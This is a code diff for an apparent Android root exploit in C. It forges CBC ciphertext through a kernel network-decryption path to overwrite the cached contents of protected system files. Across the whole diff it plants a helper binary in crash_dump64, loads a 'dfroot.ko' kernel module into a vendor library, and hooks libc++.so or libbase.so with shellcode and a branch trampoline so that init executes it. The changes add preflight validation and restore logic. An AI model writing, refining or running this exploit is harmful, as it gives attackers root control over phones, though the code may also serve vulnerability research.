@@ -14,12 +14,13 @@
 #include <sys/uio.h>
 #include <sys/wait.h>
 #include <sys/stat.h>
-#include <sys/utsname.h>
 #include <time.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include "aes256.h"
 #include "status_protocol.h"
+#include "elf_parser.h"
+#include "device_version.h"
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
@@ -29,17 +30,56 @@ static int      g_sender_port;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint32_t g_seq = 1;
-struct PatchRestore {
+
+#define MAX_RESTORE_RECORDS 4
+#define MAX_HOOK_PLANS 2
+
+/* One recorded, already-started write that cleanup must attempt to undo.
+ * orig is a private copy of the bytes present BEFORE the write. */
+struct restore_record {
     const char *lib;
-    uint64_t    tramp_aligned;
-    uint8_t     tramp_orig[16];
-    uint64_t    shell_off;
-    uint32_t    shell_padded;
-    char        shell_orig[1024];
-    int         valid;
+    uint64_t    off;
+    size_t      len;
+    uint8_t    *orig;
+    int         use_helper;
 };
 
-static struct PatchRestore g_libcxx_r;
+/* Fully validated, read-only plan for one hook target. Preflight computes
+ * every offset, instruction and saved byte before any patch_file_cbc() call. */
+struct hook_plan {
+    const char *lib;
+    const char *sym;
+    char       *stage_buf;
+    size_t      stage_len;
+    uint64_t    hook_off;
+    uint64_t    shell_off;
+    uint64_t    tramp_aligned;
+    uint32_t    start_delta;
+    uint32_t    first_insn;
+    uint32_t    hook_insn;
+    uint32_t    jmpback;
+    uint8_t     tramp_orig[16];
+    char        shell_orig[1024];
+    int         already_patched;
+};
+
+struct preflight {
+    int andr;
+    int major;
+    int minor;
+    char *ko_buf;
+    size_t ko_len;
+    uint8_t *ko_orig;
+    char *helper_buf;
+    size_t helper_len;
+    uint8_t helper_orig[1024];
+    struct hook_plan plans[MAX_HOOK_PLANS];
+    int plan_count;
+    int selected;
+    struct restore_record restores[MAX_RESTORE_RECORDS];
+    int restore_count;
+    int cleanup_failed;
+};
 
 /* IV = AES256_ECB_DEC(key, old_content) XOR desired
  * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
@@ -127,7 +167,7 @@ static int read_vendor_content(off_t offset, uint8_t buf[16]) {
  * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
  */
 static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, off_t offset,
-                            const uint8_t iv[16], int use_helper) {
+                             const uint8_t iv[16], int use_helper) {
     uint8_t hdr[24];
     *(uint32_t *)(hdr + 0) = htonl(g_spi);
     *(uint32_t *)(hdr + 4) = htonl(g_seq++);
@@ -162,12 +202,15 @@ static int do_one_write_cbc(int pipe_rd, int pipe_wr, int sk_send, int file_fd, 
 
 /* Patch len bytes of payload into file starting at file offset foff.
  * Writes in 16-byte CBC blocks.
- * For system files (use_helper=0): reads old_content with pread().
- * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
+ * old_blocks, when non-NULL, contains the exact pre-write file bytes (captured
+ * during preflight, before the KO write) so the IV never depends on a second
+ * observation of vendor state. When NULL the current content is read live —
+ * which is what cleanup needs in order to undo a partially completed write.
  * len must be a multiple of 16.
  */
 static int patch_file_cbc(const char *path, const char *payload, size_t len,
-                           size_t foff, int use_helper) {
+                          size_t foff, int use_helper,
+                          const uint8_t *old_blocks) {
     if (len % 16 != 0) {
         printf("patch_file_cbc: len=%zu not multiple of 16\n", len);
         return -1;
@@ -223,7 +266,9 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         off_t off = (off_t)(foff + i * 16);
         uint8_t old_content[16] = {0};
 
-        if (use_helper) {
+        if (old_blocks) {
+            memcpy(old_content, old_blocks + i * 16, 16);
+        } else if (use_helper) {
             if (read_vendor_content(off, old_content) < 0) {
                 rc = -1; break;
             }
@@ -285,79 +330,23 @@ extern char splice_helper_start[], splice_helper_end[];
 
 struct KoImage { int android_release, kver_major, kver_minor; const char *start, *end; };
 
+/* Exact KMI match only: a fuzzy major/minor pairing is never silently used,
+ * and getprop-only provenance is rejected before we get here. */
 static const struct KoImage *select_ko_image(int andr, int major, int minor) {
     static const struct KoImage imgs[] = {
         {13, 5, 15, dfroot_ko_13_5_15_start, dfroot_ko_13_5_15_end},
     };
-    const struct KoImage *fb = NULL;
     for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
-        if (imgs[i].kver_major != major || imgs[i].kver_minor != minor) continue;
-        if (imgs[i].android_release == andr) return &imgs[i];
-        if (!fb) fb = &imgs[i];
+        if (imgs[i].android_release == andr &&
+            imgs[i].kver_major == major && imgs[i].kver_minor == minor)
+            return &imgs[i];
     }
-    return fb;
-}
-
-static int read_device_versions(int *andr, int *major, int *minor) {
-    struct utsname u;
-    /* Kept at function scope: m = release below is used after the if-block,
-     * so a block-scoped release[] would be a dangling pointer (UB). */
-    char vendor_ver[5] = {0};
-    char release[15];
-    if (uname(&u) != 0) return -1;
-    if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
-    const char *m = strstr(u.release, "android");
-    if (!m) {
-        printf("uname -r is missing Android version, trying getprop\n");
-
-        /* Vendor kernel tags can be frozen at an older Android release while
-         * the OS has been upgraded; fall back to the generic property. */
-        static const char *const props[] = {
-            "ro.vendor.build.version.release",
-            "ro.build.version.release",
-        };
-        int got = 0;
-        for (size_t i = 0; i < sizeof(props) / sizeof(props[0]); i++) {
-            char cmd[80];
-            snprintf(cmd, sizeof(cmd), "getprop %s", props[i]);
-            FILE *f = popen(cmd, "r");
-            if (!f) continue;
-            char line[32];
-            if (fgets(line, sizeof(line), f) != NULL) {
-                line[strcspn(line, "\r\n")] = '\0';
-                size_t ll = strlen(line);
-                int ok = ll > 0 && ll < sizeof(vendor_ver);
-                for (size_t k = 0; ok && k < ll; k++)
-                    if (!isdigit((unsigned char)line[k])) ok = 0;
-                int pst = pclose(f);
-                if (ok && pst == 0) {
-                    memcpy(vendor_ver, line, ll + 1);
-                    got = 1;
-                    break;
-                }
-            } else {
-                pclose(f);
-            }
-        }
-        if (!got) {
-            printf("getprop failed to read Android version\n");
-            return -1;
-        }
-        snprintf(release, sizeof(release), "android%s", vendor_ver);
-        m = release;
-    }
-    const char *avp = m + 7;
-    if (!isdigit((unsigned char)*avp)) return -1;
-    char *endp = NULL;
-    errno = 0;
-    long av = strtol(avp, &endp, 10);
-    if (errno == ERANGE || endp == avp || av <= 0 || av > 100) return -1;
-    *andr = (int)av;
-    return 0;
+    return NULL;
 }
 
 /* Pad payload to a multiple of 16 bytes in a heap buffer. Caller must free(). */
 static char *pad16(const char *data, size_t len, size_t *out_len) {
+    if (len > SIZE_MAX - 15) return NULL;
     size_t padded = (len + 15) & ~(size_t)15;
     char *buf = calloc(1, padded);
     if (buf) memcpy(buf, data, len);
@@ -365,174 +354,356 @@ static char *pad16(const char *data, size_t len, size_t *out_len) {
     return buf;
 }
 
-/* Write splicehelper into crash_dump64 page cache. */
-static int patch_helper(void) {
-    size_t len;
-    char *buf = pad16(splice_helper_start,
-                      (size_t)(splice_helper_end - splice_helper_start), &len);
-    if (!buf) { printf("patch: crash_dump64 - pad16 alloc failed\n"); return -1; }
-    printf("patch: crash_dump64 <- splicehelper (%zu bytes)\n", len);
-    int ret = patch_file_cbc(kCrashDump, buf, len, 0, 0);
-    if (ret) { free(buf); printf("patch: crash_dump64 patch failed: %d\n", ret); return ret; }
+/* ---- Read-only preflight: no patch_file_cbc() call happens here ---- */
 
-    uint8_t verify[16];
-    int vfd = open(kCrashDump, O_RDONLY);
-    if (vfd < 0) {
-        printf("patch: crash_dump64 verification open failed: %s\n", strerror(errno));
-        free(buf);
+static int record_restore(struct preflight *pf, const char *lib, uint64_t off,
+                          size_t len, const uint8_t *orig, int use_helper) {
+    struct restore_record *r;
+    if (pf->restore_count >= MAX_RESTORE_RECORDS) {
+        printf("cleanup: too many restore records\n");
         return -1;
     }
-    ssize_t n = pread(vfd, verify, 16, 16);
-    close(vfd);
-    if (n != 16) {
-        if (n < 0)
-            printf("patch: crash_dump64 verification read failed: %s\n", strerror(errno));
-        else
-            printf("patch: crash_dump64 verification short read: got %zd bytes\n", n);
-        free(buf);
+    r = &pf->restores[pf->restore_count];
+    r->orig = (uint8_t *)malloc(len ? len : 1);
+    if (!r->orig) {
+        printf("cleanup: restore record allocation failed\n");
         return -1;
     }
-    if (memcmp(verify, buf + 16, 16) != 0) {
-        printf("patch: crash_dump64 verification failed\n");
-        printf("patch: DEVICE NOT VULNERABLE\n");
-        free(buf);
-        return -1;
-    }
-    free(buf);
+    memcpy(r->orig, orig, len);
+    r->lib = lib;
+    r->off = off;
+    r->len = len;
+    r->use_helper = use_helper;
+    pf->restore_count++;
     return 0;
 }
 
-static int patch_ko(void) {
-    int andr = 0, major = 0, minor = 0;
-    if (read_device_versions(&andr, &major, &minor) != 0) {
-        printf("Can't parse kernel version - Non-GKI device? (unsupported)\n"); return 1;
-    }
-    const struct KoImage *ko = select_ko_image(andr, major, minor);
-    if (!ko) {
-        printf("Unsupported kernel %d.%d android %d\n", major, minor, andr); return 1;
-    }
-    printf("Using KMI: android%d-%d.%d\n",
-             ko->android_release, ko->kver_major, ko->kver_minor);
-
-    size_t len;
-    char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
-    if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
-    printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
-    int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
-    free(buf);
-    if (ret) printf("patch: %s patch failed: %d\n", libcxx_ko_target, ret);
-    return ret;
-}
-
-static void cleanup(void) {
-    if (!g_libcxx_r.valid) return;
-    printf("\n=== cleanup ===\n");
-    printf("restoring trampoline in %s\n", g_libcxx_r.lib);
-    patch_file_cbc(g_libcxx_r.lib, (char *)g_libcxx_r.tramp_orig, 16,
-                   (size_t)g_libcxx_r.tramp_aligned, 0);
-    printf("restoring shellcode in %s\n", g_libcxx_r.lib);
-    patch_file_cbc(g_libcxx_r.lib, g_libcxx_r.shell_orig, g_libcxx_r.shell_padded,
-                   (size_t)g_libcxx_r.shell_off, 0);
-}
-
-int find_hook_target(const char *lib, const char *sym,
-                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
-                     size_t shellcode_size);
-
-static int patch_hook(const char *lib, const char *sym,
-                      char *stage_data, uint32_t stage_len, char *stage_start,
-                      char *first_inst_copy, struct PatchRestore *restore) {
+/* Validate every numeric, alignment, branch-range and overlap constraint for
+ * one hook target, and save the original bytes. Still strictly read-only. */
+static enum elf_parse_rc prepare_hook_plan(const char *lib, const char *sym,
+                                           struct hook_plan *plan) {
     const uint32_t BRANCH = 0x14000000;
-    uint32_t start_delta = (uint32_t)(stage_start - stage_data);
+    uint64_t hook = 0, shell = 0, aligned, shell_end;
+    uint32_t first = 0;
+    enum elf_parse_rc rc;
+    long long delta1, delta2;
+    size_t pos;
+    const char *stage = libcxx_data;
+    const char *start_sym = libcxx_start;
+    const char *copy_sym = libcxx_first_inst_copy;
+    struct stat st;
+    int fd;
 
-    if (first_inst_copy < stage_data ||
-        (size_t)(first_inst_copy - stage_data) + 4 > stage_len) {
-        printf("patch: %s first_inst_copy out of range\n", lib);
+    memset(plan, 0, sizeof(*plan));
+    plan->lib = lib;
+    plan->sym = sym;
+    if (libcxx_len < 4 || start_sym < stage ||
+        (size_t)(start_sym - stage) > libcxx_len ||
+        copy_sym < stage || (size_t)(copy_sym - stage) + 4 > libcxx_len) {
+        printf("preflight: %s stage layout invalid\n", lib);
+        return ELF_PARSE_INVALID;
+    }
+    plan->stage_buf = pad16(stage, libcxx_len, &plan->stage_len);
+    if (!plan->stage_buf) return ELF_PARSE_INVALID;
+
+    printf("Finding symbol offsets for %s:\n", lib);
+    rc = find_hook_target(lib, sym, &hook, &shell, &first, plan->stage_len);
+    if (rc != ELF_PARSE_OK) return rc; /* UNSUPPORTED: try next; INVALID: abort */
+    printf("Found: hook=0x%llx shellcode=0x%llx len=%u\n",
+           (unsigned long long)hook, (unsigned long long)shell, libcxx_len);
+
+    if ((hook & 3) != 0) {
+        printf("preflight: %s hook not 4-byte aligned\n", lib);
+        return ELF_PARSE_INVALID;
+    }
+    pos = (size_t)(hook & 15);
+    if (pos > 12) {
+        printf("preflight: %s hook at 0x%llx leaves <4 bytes in trampoline block\n",
+               lib, (unsigned long long)hook);
+        return ELF_PARSE_INVALID;
+    }
+    plan->start_delta = (uint32_t)(start_sym - stage);
+    delta1 = (long long)(shell + plan->start_delta) - (long long)hook;
+    if (delta1 % 4 != 0 || delta1 < -0x07FFFFFCLL || delta1 > 0x07FFFFFCLL) {
+        printf("preflight: %s branch delta1 invalid\n", lib);
+        return ELF_PARSE_INVALID;
+    }
+    plan->hook_insn = BRANCH | (((unsigned long long)delta1 >> 2) & 0x3ffffff);
+    if (first == plan->hook_insn) {
+        printf("preflight: %s already patched\n", lib);
+        plan->already_patched = 1;
+        return ELF_PARSE_OK;
+    }
+
+    delta2 = (long long)(hook + 4) - (long long)(shell + libcxx_len - 4);
+    if (delta2 % 4 != 0 || delta2 < -0x07FFFFFCLL || delta2 > 0x07FFFFFCLL) {
+        printf("preflight: %s branch delta2 invalid\n", lib);
+        return ELF_PARSE_INVALID;
+    }
+    plan->jmpback = BRANCH | (((unsigned long long)delta2 >> 2) & 0x3ffffff);
+    if (plan->stage_len > sizeof(plan->shell_orig)) {
+        printf("preflight: %s shellcode too large to save (%zu)\n", lib, plan->stage_len);
+        return ELF_PARSE_INVALID;
+    }
+
+    *(uint32_t *)&plan->stage_buf[libcxx_len - 4] = plan->jmpback;
+    *(uint32_t *)&plan->stage_buf[copy_sym - stage] = first;
+
+    aligned = hook & ~(uint64_t)15;
+    shell_end = shell + plan->stage_len;
+    if (shell_end < shell || aligned > UINT64_MAX - 16 ||
+        (shell < aligned + 16 && aligned < shell_end)) {
+        printf("preflight: %s shellcode/trampoline ranges overlap\n", lib);
+        return ELF_PARSE_INVALID;
+    }
+    fd = open(lib, O_RDONLY | O_CLOEXEC);
+    if (fd < 0) {
+        printf("preflight: open %s failed: %s\n", lib, strerror(errno));
+        return ELF_PARSE_INVALID;
+    }
+    if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode) || st.st_size < 0 ||
+        (uint64_t)st.st_size < shell_end || (uint64_t)st.st_size < aligned + 16) {
+        printf("preflight: %s too small for validated patch ranges\n", lib);
+        close(fd);
+        return ELF_PARSE_INVALID;
+    }
+    if (pread(fd, plan->shell_orig, plan->stage_len, (off_t)shell) != (ssize_t)plan->stage_len ||
+        pread(fd, plan->tramp_orig, 16, (off_t)aligned) != 16) {
+        printf("preflight: pread %s originals failed\n", lib);
+        close(fd);
+        return ELF_PARSE_INVALID;
+    }
+    close(fd);
+
+    plan->hook_off = hook;
+    plan->shell_off = shell;
+    plan->tramp_aligned = aligned;
+    plan->first_insn = first;
+    return ELF_PARSE_OK;
+}
+
+static void free_preflight(struct preflight *pf) {
+    int i;
+    for (i = 0; i < pf->plan_count; i++) free(pf->plans[i].stage_buf);
+    for (i = 0; i < pf->restore_count; i++) free(pf->restores[i].orig);
+    free(pf->ko_buf);
+    free(pf->ko_orig);
+    free(pf->helper_buf);
+    memset(pf, 0, sizeof(*pf));
+    pf->selected = -1;
+}
+
+static int preflight(struct preflight *pf) {
+    static const struct {
+        const char *lib;
+        const char *sym;
+    } candidates[] = {
+        { "/system/lib64/libc++.so",
+          "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_" },
+        { "/system/lib64/libbase.so", "_ZN7android4base10LogMessageD1Ev" },
+    };
+    enum version_provenance prov = VERSION_PROV_UNSET;
+    const struct KoImage *ko;
+    struct stat st;
+    size_t i, raw_len;
+    int fd, ok = -1;
+
+    memset(pf, 0, sizeof(*pf));
+    pf->selected = -1;
+
+    printf("\n=== preflight (read-only validation) ===\n");
+    if (read_device_versions(&pf->andr, &pf->major, &pf->minor, &prov) != 0 ||
+        prov != VERSION_PROV_UNAME) {
+        printf("preflight: strict kernel/Android version unavailable "
+               "(getprop-only provenance is rejected)\n");
         return -1;
     }
-
-    size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
-    if (!buf) { printf("patch: %s - pad16 alloc failed\n", lib); return -1; }
-
-    if (padded > sizeof(restore->shell_orig)) {
-        printf("shellcode too large to save (%zu)\n", padded);
-        free(buf); return -1;
+    ko = select_ko_image(pf->andr, pf->major, pf->minor);
+    if (!ko) {
+        printf("preflight: unsupported exact KMI android%d-%d.%d\n",
+               pf->andr, pf->major, pf->minor);
+        return -1;
     }
+    printf("preflight: exact KMI android%d-%d.%d (uname provenance)\n",
+           pf->andr, pf->major, pf->minor);
 
-    uint64_t hook_off, shell_off; uint32_t first_insn;
-    printf("Finding symbol offsets for %s:\n", lib);
-    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, padded)) {
-        printf("failed to find offsets for %s\n", lib); free(buf); return 1;
+    /* Helper: stat it and save the exact bytes we are about to overwrite. */
+    fd = open(kCrashDump, O_RDONLY | O_CLOEXEC);
+    if (fd < 0 || fstat(fd, &st) != 0 || !S_ISREG(st.st_mode) || st.st_size < 32) {
+        printf("preflight: %s missing/not a regular file/too small\n", kCrashDump);
+        if (fd >= 0) close(fd);
+        return -1;
     }
-    printf("Found: hook=0x%lx shellcode=0x%lx len=%u\n", hook_off, shell_off, stage_len);
-
-    if ((hook_off & 3) != 0) {
-        printf("patch: %s hook not 4-byte aligned\n", lib);
-        free(buf); return -1;
-    }
-
-    int pos = (int)(hook_off & 15);
-    if (pos > 12) {
-        printf("patch: %s hook at 0x%lx leaves only %d bytes in trampoline block\n",
-               lib, (unsigned long)hook_off, 16 - pos);
-        free(buf); return -1;
-    }
-
-    long long delta1 = (long long)(shell_off + start_delta) - (long long)hook_off;
-    if (delta1 % 4 != 0) {
-        printf("patch: %s branch delta1 not divisible by 4\n", lib);
-        free(buf); return -1;
-    }
-    if (delta1 < -0x07FFFFFCLL || delta1 > 0x07FFFFFCLL) {
-        printf("patch: %s branch delta1 out of range\n", lib);
-        free(buf); return -1;
-    }
-    uint32_t hook_insn = BRANCH | (((unsigned long long)delta1 >> 2) & 0x3ffffff);
-
-    if (first_insn == hook_insn) {
-        printf("%s already patched\n", lib); free(buf); return 0;
-    }
-
-    long long delta2 = (long long)(hook_off + 4) - (long long)(shell_off + stage_len - 4);
-    if (delta2 % 4 != 0) {
-        printf("patch: %s branch delta2 not divisible by 4\n", lib);
-        free(buf); return -1;
-    }
-    if (delta2 < -0x07FFFFFCLL || delta2 > 0x07FFFFFCLL) {
-        printf("patch: %s branch delta2 out of range\n", lib);
-        free(buf); return -1;
-    }
-    uint32_t jmpback = BRANCH | (((unsigned long long)delta2 >> 2) & 0x3ffffff);
-
-    *(uint32_t *)&buf[stage_len - 4] = jmpback;
-    *(uint32_t *)&buf[first_inst_copy - stage_data] = first_insn;
-
-    uint64_t aligned = hook_off & ~(uint64_t)15;
-    int fd = open(lib, O_RDONLY);
-    if (fd < 0) { printf("open %s failed: %s\n", lib, strerror(errno)); free(buf); return -1; }
-    int ok = pread(fd, restore->shell_orig, padded,  (off_t)shell_off) == (ssize_t)padded
-          && pread(fd, restore->tramp_orig, 16,       (off_t)aligned)  == 16;
     close(fd);
-    if (!ok) { printf("pread %s save failed\n", lib); free(buf); return -1; }
+    raw_len = (size_t)(splice_helper_end - splice_helper_start);
+    pf->helper_buf = pad16(splice_helper_start, raw_len, &pf->helper_len);
+    if (!pf->helper_buf || pf->helper_len > sizeof(pf->helper_orig) || pf->helper_len < 32) {
+        printf("preflight: helper payload too large/small to save\n");
+        goto fail;
+    }
+    fd = open(kCrashDump, O_RDONLY | O_CLOEXEC);
+    if (fd < 0 || pread(fd, pf->helper_orig, pf->helper_len, 0) != (ssize_t)pf->helper_len) {
+        printf("preflight: cannot save %s originals\n", kCrashDump);
+        if (fd >= 0) close(fd);
+        goto fail;
+    }
+    close(fd);
 
-    restore->lib           = lib;
-    restore->shell_off     = shell_off;
-    restore->shell_padded  = (uint32_t)padded;
-    restore->tramp_aligned = aligned;
-    restore->valid         = 1;
+    /* KO target: verify length before padding; capture happens after the
+     * helper patch but before the KO write (see exploit()). */
+    raw_len = (size_t)(ko->end - ko->start);
+    pf->ko_buf = pad16(ko->start, raw_len, &pf->ko_len);
+    if (!pf->ko_buf || pf->ko_len < 16) goto fail;
+    fd = open(libcxx_ko_target, O_RDONLY | O_CLOEXEC);
+    if (fd < 0 || fstat(fd, &st) != 0 || !S_ISREG(st.st_mode) || st.st_size < 0 ||
+        (uint64_t)st.st_size < pf->ko_len) {
+        printf("preflight: %s missing/too short for KO payload\n", libcxx_ko_target);
+        if (fd >= 0) close(fd);
+        goto fail;
+    }
+    close(fd);
+    pf->ko_orig = (uint8_t *)malloc(pf->ko_len);
+    if (!pf->ko_orig) goto fail;
 
-    printf("patch: %s <- shellcode (%zu bytes)\n", lib, padded);
-    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0);
-    free(buf);
-    if (ret) { printf("patch: %s shellcode patch failed: %d\n", lib, ret); return ret; }
+    /* Hook target selection. INVALID aborts with no fallback; only
+     * UNSUPPORTED (no usable symbol/placement) selects the next candidate. */
+    for (i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
+        struct hook_plan plan;
+        enum elf_parse_rc rc = prepare_hook_plan(candidates[i].lib,
+                                                 candidates[i].sym, &plan);
+        if (elf_parse_rc_try_next(rc)) {
+            printf("preflight: %s has no usable target; trying next candidate\n",
+                   candidates[i].lib);
+            free(plan.stage_buf);
+            continue;
+        }
+        if (rc != ELF_PARSE_OK) {
+            printf("preflight: invalid/unsupported ELF in %s - aborting without fallback\n",
+                   candidates[i].lib);
+            free(plan.stage_buf);
+            goto fail;
+        }
+        if (pf->plan_count >= MAX_HOOK_PLANS) {
+            free(plan.stage_buf);
+            goto fail;
+        }
+        pf->plans[pf->plan_count] = plan;
+        pf->selected = pf->plan_count;
+        pf->plan_count++;
+        printf("preflight: selected hook target %s\n", candidates[i].lib);
+        break;
+    }
+    if (pf->selected < 0) {
+        printf("preflight: no hook target available - DEVICE NOT SUPPORTED\n");
+        goto fail;
+    }
 
+    ok = 0;
+    return ok;
+
+fail:
+    free_preflight(pf);
+    return -1;
+}
+
+/* ---- Writes: only called from exploit(), after preflight succeeded ---- */
+
+static int capture_ko_originals(struct preflight *pf) {
+    size_t blocks = pf->ko_len / 16, i;
+    for (i = 0; i < blocks; i++) {
+        if (read_vendor_content((off_t)(i * 16), pf->ko_orig + i * 16) < 0) {
+            printf("capture: vendor original block %zu failed\n", i);
+            return -1;
+        }
+    }
+    printf("capture: saved %zu vendor blocks before KO write\n", blocks);
+    return 0;
+}
+
+static int patch_helper(struct preflight *pf) {
+    uint8_t verify[16];
+    int vfd, n;
+
+    if (record_restore(pf, kCrashDump, 0, pf->helper_len, pf->helper_orig, 0) != 0) return -1;
+    printf("patch: crash_dump64 <- splicehelper (%zu bytes)\n", pf->helper_len);
+    if (patch_file_cbc(kCrashDump, pf->helper_buf, pf->helper_len, 0, 0,
+                       pf->helper_orig) != 0) {
+        printf("patch: crash_dump64 patch failed\n");
+        return -1;
+    }
+    vfd = open(kCrashDump, O_RDONLY);
+    if (vfd < 0) {
+        printf("patch: crash_dump64 verification open failed: %s\n", strerror(errno));
+        return -1;
+    }
+    n = (int)pread(vfd, verify, 16, 16);
+    close(vfd);
+    if (n != 16) {
+        printf("patch: crash_dump64 verification read failed (n=%d)\n", n);
+        return -1;
+    }
+    if (memcmp(verify, pf->helper_buf + 16, 16) != 0) {
+        printf("patch: crash_dump64 verification failed\n");
+        printf("patch: DEVICE NOT VULNERABLE\n");
+        return -1;
+    }
+    return 0;
+}
+
+static int patch_ko(struct preflight *pf) {
+    if (record_restore(pf, libcxx_ko_target, 0, pf->ko_len, pf->ko_orig, 1) != 0) return -1;
+    printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, pf->ko_len);
+    if (patch_file_cbc(libcxx_ko_target, pf->ko_buf, pf->ko_len, 0, 1, pf->ko_orig) != 0) {
+        printf("patch: %s patch failed\n", libcxx_ko_target);
+        return -1;
+    }
+    return 0;
+}
+
+static int apply_hook_plan(struct preflight *pf, const struct hook_plan *plan) {
     uint8_t blk[16];
-    memcpy(blk, restore->tramp_orig, 16);
-    memcpy(&blk[pos], &hook_insn, 4);
-    printf("patch: %s <- trampoline (16 bytes)\n", lib);
-    int ret2 = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0);
-    if (ret2) printf("patch: %s trampoline patch failed: %d\n", lib, ret2);
-    return ret2;
+    if (plan->already_patched) {
+        printf("patch: %s already patched\n", plan->lib);
+        return 0;
+    }
+    /* Record first: a write that fails halfway still needs a restore attempt. */
+    if (record_restore(pf, plan->lib, plan->shell_off, plan->stage_len,
+                       (const uint8_t *)plan->shell_orig, 0) != 0) return -1;
+    if (record_restore(pf, plan->lib, plan->tramp_aligned, 16,
+                       plan->tramp_orig, 0) != 0) return -1;
+
+    printf("patch: %s <- shellcode (%zu bytes)\n", plan->lib, plan->stage_len);
+    if (patch_file_cbc(plan->lib, plan->stage_buf, plan->stage_len,
+                       (size_t)plan->shell_off, 0,
+                       (const uint8_t *)plan->shell_orig) != 0) return -1;
+    memcpy(blk, plan->tramp_orig, 16);
+    memcpy(&blk[plan->hook_off & 15], &plan->hook_insn, 4);
+    printf("patch: %s <- trampoline (16 bytes)\n", plan->lib);
+    return patch_file_cbc(plan->lib, (char *)blk, 16, (size_t)plan->tramp_aligned,
+                          0, plan->tramp_orig);
+}
+
+/* Attempt every recorded restore in reverse write order. A helper restore is
+ * last so vendor restores that still use crash_dump64 remain possible. */
+static int cleanup(struct preflight *pf) {
+    int i, failed = 0;
+    if (pf == NULL || pf->restore_count == 0) return 0;
+    printf("\n=== cleanup ===\n");
+    for (i = pf->restore_count - 1; i >= 0; i--) {
+        struct restore_record *r = &pf->restores[i];
+        printf("restoring %s at 0x%llx (%zu bytes)\n", r->lib,
+               (unsigned long long)r->off, r->len);
+        /* NULL old_blocks: read the CURRENT (possibly patched) bytes to build
+         * the inverse CBC IV. Our pre-write copy is the desired plaintext. */
+        if (patch_file_cbc(r->lib, (const char *)r->orig, r->len,
+                           (size_t)r->off, r->use_helper, NULL) != 0) {
+            printf("restore FAILED for %s\n", r->lib);
+            failed = 1;
+        } else {
+            printf("restore OK for %s\n", r->lib);
+        }
+    }
+    return failed ? -1 : 0;
 }
 
 static int createOrphanProcess(void) {
@@ -762,32 +933,27 @@ static int exp_wait_child(void *ctx, int timeout_ms)
 
 static void status_cleanup_cb(void *ctx)
 {
-    (void)ctx;
-    cleanup();
+    struct preflight *pf = (struct preflight *)ctx;
+    if (cleanup(pf) < 0) {
+        pf->cleanup_failed = 1;
+        printf("cleanup: one or more restores failed\n");
+    }
 }
 
-static int exploit(void) {
+static int exploit(struct preflight *pf) {
     printf("\n=== exploit (patching files) ===\n");
 
     int rc = 3;
-    if (patch_helper()) goto done;
-    if (patch_ko()) goto done;
-    int hook_rc = patch_hook("/system/lib64/libc++.so",
-                             "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
-                             libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
-                             &g_libcxx_r);
-    /* Target selection returns 1 before writing. libbase's logging destructor
-     * also runs when init reaps an orphan, and may have more executable slack. */
-    if (hook_rc == 1)
-        hook_rc = patch_hook("/system/lib64/libbase.so",
-                             "_ZN7android4base10LogMessageD1Ev",
-                             libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
-                             &g_libcxx_r);
-    if (hook_rc) goto done;
+    if (patch_helper(pf)) goto done;
+    /* Helper must be patched before vendor reads; capture BEFORE the KO write
+     * so the restore plan cannot be poisoned by our own payload. */
+    if (capture_ko_originals(pf)) goto done;
+    if (patch_ko(pf)) goto done;
+    if (apply_hook_plan(pf, &pf->plans[pf->selected])) goto done;
 
     rc = 2;
     usleep(500000);
-    
+
     printf("\n=== init  ===\n");
     createOrphanProcess();
 
@@ -812,7 +978,7 @@ static int exploit(void) {
          * deadline and could miss it). The flow releases the patched files
          * exactly once on observation or timeout, so cleanup is never delayed
          * until main() returns. */
-        wait = status_flow_run(&io, NULL, 70000, 10000, status_cleanup_cb, &outcome);
+        wait = status_flow_run(&io, pf, 70000, 10000, status_cleanup_cb, &outcome);
         printf("status: %s (rc=%d)\n",
                wait == DONE ? "final status observed" :
                wait == TIMEOUT ? "timeout waiting for final status" : "status error",
@@ -824,16 +990,28 @@ done:
     /* No bootstrap was launched (patch failure), so no final status will ever
      * be published. Release the patched files here rather than waiting out a
      * 70 s budget with no possible terminal observation. */
-    cleanup();
+    if (cleanup(pf) < 0) pf->cleanup_failed = 1;
     printf("patch: ERROR - failed to patch files\n");
     return 3;
 }
 
 int main(int argc, char **argv) {
+    struct preflight pf;
+    int rc;
     setvbuf(stdout, NULL, _IONBF, 0);
     if (setup(argc, argv) != 0) return 2;
+    if (preflight(&pf) != 0) {
+        printf("preflight: no files were patched; aborting\n");
+        clear_secret(g_aes_key, sizeof(g_aes_key));
+        return 3;
+    }
     /* exploit()/status_flow_run() owns cleanup exactly once. */
-    int rc = exploit();
+    rc = exploit(&pf);
+    /* A success outcome is only truthful if every recorded restore worked. */
+    if (rc == 0 && pf.cleanup_failed) {
+        printf("cleanup failure: downgrading success rc 0 to error rc 1\n");
+        rc = 1;
+    }
     clear_secret(g_aes_key, sizeof(g_aes_key));
     return rc;
 }
